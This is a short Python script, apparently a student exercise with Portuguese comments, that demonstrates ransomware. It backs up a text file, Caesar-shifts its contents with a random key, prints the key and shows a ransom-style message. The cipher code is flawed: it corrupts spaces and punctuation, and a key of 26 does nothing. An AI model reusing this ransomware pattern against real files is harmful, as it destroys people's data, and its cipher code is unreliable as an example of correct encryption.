# Ransomware que criptografa um conteúdo txt utilizando a cifra de césar

########################################################################
# Arthur Santos Ferreira                            RA: 082180042      #
# Clarissa Reis Fonseca                             RA: 082180003      #
# Lucas Pontelli Martin                             RA: 081190042      #
# Ronaldo Vicente Lopes de Souza                    RA: 082180041      #
#######################################################################

import os
import random


# Função que recebe o nosso arquivo texto e a valor da chave de criptografia
def encrypt(text, s):
    # 1 .Aqui pegamos o valor ASCII da letra e subtraimos o valor da letra 'A'.
    # 2. Adicione o valor da chave a este número deslocando-o em N casas.
    # 3. Agora dividimos o número obtido por 26 e pegamos só o resto da divisão.
    result = ""
    for i in range(len(text)):
        char = text[i]

        # upper case
        if char.isupper():
            result += chr((ord(char) + s - 65) % 26 + 65)
        # lower case
        else:
            result += chr((ord(char) + s - 97) % 26 + 97)

    return result


# Arquivos contendo o file original e o seu respectivo backup
ori_file = "original.txt"
back_file = "backup.txt"

# Verifica se o nosso file original existe, se sim, lê, atribui o nome original file.
# Em seguida escreve o conteúdo do nosso file original no file backup
if os.path.exists(ori_file):
    with open(ori_file, "r") as original_file:
        with open(back_file, "w") as backup_file:
            backup_file.write(original_file.read())

    # Shift/Key varia entre 1 e 27. Aqui estamos gerando ela de forma randomica,
    # printando para facilitar a descriptogtafia
    s = random.randint(1, 27)
    print(" Shift/Key:", s)

    with open(ori_file, "r+") as original_file:
        text = original_file.read()
        encrypted_text = encrypt(text, s)
        original_file.seek(0)
        original_file.write(encrypted_text)
        original_file.truncate()

    # Mensagem que auxilia a vítima a conseguir decriptografar o seu arquivo.
    print(
        "Os seus dados foram encriptados. Para recupera-los, acesse: 'https://www.dcode.fr/caesar-cipher' e informe o tamanho da Shift/Key (number) 's'"
    )
else:
    print(f"File {ori_file} não existe.")
